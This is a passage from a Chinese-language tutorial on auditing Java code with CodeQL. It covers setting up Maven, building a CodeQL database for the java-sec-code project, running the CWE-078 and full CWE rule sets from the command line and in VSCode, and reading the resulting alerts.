Maven是Java源代码的编译⼯具，CodeQL在创建数据库时，会⾃动探测或使⽤指定的编译⽅式，对源代码进⾏分析。在编译的过程中构建⼀个抽象的语法树，在抽象的语法树的基础上，CodeQL进⾏语义标记，⽐如变量的定义和使⽤、函数调⽤等。当前的项⽬源码我们需要⾃⼰指定CodeQL使⽤Maven去执⾏编译。

下载地址：https://archive.apache.org/dist/maven/maven-3/3.9.6/binaries/apache-maven-3.9.6-bin.zip

在Java配套教学⼯具中有下载好的压缩包`apache-maven-3.9.6-bin.zip` ，将解压之后的⽂件夹放到C盘 的根⽬录中，并将`C:\apache-maven-3.9.6\bin` 路径加⼊到系统环境变量中。

执⾏命令测试，如下图所示：

```bash
mvn -v
```

![image-20240918145936610](https://image.201068.xyz/assets/32.JAVA/image-20240918145936610.png)

#### 3.⽣成数据库            

CodeQL只可以对解析引擎编译产⽣的数据库进⾏扫描，所以需要先⽣成⽬标数据库。

语法结构：

```bash
codeql database create 数据库名 --language=java --source-root=源码路径 --command="编译命令" --overwrite
```

参数说明：

-  `--command`：参数如果不指定，会使⽤默认的编译命令和参数

-  `--source-root`：源码路径

-  `--overwrite`：表示 create 的⽬标 database 对已有的 database 做覆盖

-  `--language`：要根据具体项⽬的编译语⾔指定

对应关系如下：

打开CMD，执⾏下⾯命令⽣成审计数据库。

```bash
codeql database create java-sec-code-qlDatabase --language=java --source-root=D:\codes\java_codeql\java-sec-code --command="mvn clean install" --overwrite
```

![image-20240918154357295](https://image.201068.xyz/assets/32.JAVA/image-20240918154357295.png)

#### 4.漏洞扫描

CodeQL会根据现有的代码数据库，进⾏对应的漏洞扫描。如果源代码有更新，还需要再次⽣成审计数据库。

语法结构：

```bash
codeql database analyze 审计数据库路径 codeql规则库漏洞路径 --format=csv --output=result.csv
```

参数说明：

-  `analyze`：分析数据库，在源代码的上下⽂中产⽣有意义的结果

-  `--format`：结果输出格式

-  `--output`：结果⽂件输出路径

-  `--threads`：多线程运⾏

打开CMD，执⾏下⾯命令扫描数据库并⽣成结果。

```bash
codeql database analyze D:\codes\java_codeql\java-sec-code-qlDatabase D:\codes\java_codeql\codeql-sdk\java\ql\src\Security\CWE\CWE-078 --threads=10 --format=csv --output=result.csv
```

![image-20240918161442260](https://image.201068.xyz/assets/32.JAVA/image-20240918161442260.png)

![image-20240918161615139](https://image.201068.xyz/assets/32.JAVA/image-20240918161615139.png)

扫描的时候，可以扫描指定的漏洞，也可以**扫描全部漏洞**。

```bash
codeql database analyze D:\codes\java_codeql\java-sec-code-qlDatabase D:\codes\java_codeql\codeql-sdk\java\ql\src\Security\CWE --threads=10 --format=csv --output=result_all.csv
```



#### 5.分析结果

![image-20240918100426480](https://image.201068.xyz/assets/32.JAVA/image-20240918100426480.png)

> 解释：
>
> `Uncontrolled data  used in path expression`
>
> 路径表达式中使⽤了不受控制的数据
>
>  `Accessing paths influenced by users can  allow an attacker to access unexpected resources.`
>
> 访问受⽤户影响的路径可以使攻击者访问到意外的资源
>
> `error`
>
> 代码扫描警报级别，警报严重性级别可能为`Error` 、 `Warning`  和 `Note`
>
> 其余的每列都会告诉使⽤者是哪个⽂件的哪⼀⾏触发了漏洞规则。
>

#### 6.总结

可以看到，对于需要进⾏详细污点分析的漏洞模式，借助 CodeQL 进⾏漏洞排查是极其有效的。

但是 CodeQL 存在两个具有较⼤时间成本的环节：编译⽣成 AST 数据库、编写 QL 规则。

当然我们不需要去编写QL规则，开源的规则库已经⾜够应付中⼤型项⽬代码的审计⼯作，根据数据库去匹配QL规则会更加耗时⼀些。

最后总结下使⽤ CodeQL 进⾏漏洞挖掘的主要流程：

-  使⽤ CodeQL 命令，根据⽬标源代码编译⽣成 database，该 database 包含整个代码的 AST 树，CodeQL 就是查询该 
   database 来进⾏漏洞发现的；
-  根据已知漏洞给出的 CodeQL 规则，来查询⽬标 database 找出类似的漏洞。

-  根据 CodeQL 规则运⾏的结果进⾏代码审计，分析⽬标代码是否真正存在漏洞，确认漏洞的成因及触发条件。

### 四、VSCode插件代码审计                                                                                                

#### 第⼀步，安装CodeQL插件

![image-20240918164042239](https://image.201068.xyz/assets/32.JAVA/image-20240918164042239.png)

#### 第⼆步，设置CodeQL命令路径

![image-20240918164008344](https://image.201068.xyz/assets/32.JAVA/image-20240918164008344.png)

#### 第三步，打开规则库⽬录

打开规则库⽬录`C:\codeql\codeql-sdk`，选任意⼀个打开⽂件夹即可

![image-20240918165414504](https://image.201068.xyz/assets/32.JAVA/image-20240918165414504.png)

#### 第四步，导⼊代码数据库

导⼊第三节⽣成的代码数据库`java-sec-code-qlDatabase`。

如果弹出下⾯的警告框，点击“`No`”。

![image-20240918165154518](https://image.201068.xyz/assets/32.JAVA/image-20240918165154518.png)

#### 第五步，验证漏洞

根据规则库中的规则，验证代码数据库中的漏洞。

vscode回到资源管理器，选择`codeql-sdk`⽬录下的 `java\ql\src\Security\CWE\CWE-078` 漏洞，选择其中⼀条ql规则，⿏标右键点击选择``CodeQL:Run Query on Selected Database` ，开始查询。

![image-20240918170205342](https://image.201068.xyz/assets/32.JAVA/image-20240918170205342.png)

#### 第六步，查看结果

根据查询给出的结果，查看代码哪⾥出现问题。

在分析结果中提示“`Uncontrolled command line on java_test`”，意思是，`java_test`中找到不受控制的命令⾏。

![image-20240918170048889](https://image.201068.xyz/assets/32.JAVA/image-20240918170048889.png)

当然，也可以直接使⽤**整个⽬录**的代码查询规则，⽐如在`CWE-078`⽬录上点击⿏标右键，选择`CodeQL:Run Queries in Selected Files` ，可以使⽤整个⽬录下所有的代码查询规则去分析代码数据库。

![image-20240918165823476](https://image.201068.xyz/assets/32.JAVA/image-20240918165823476.png)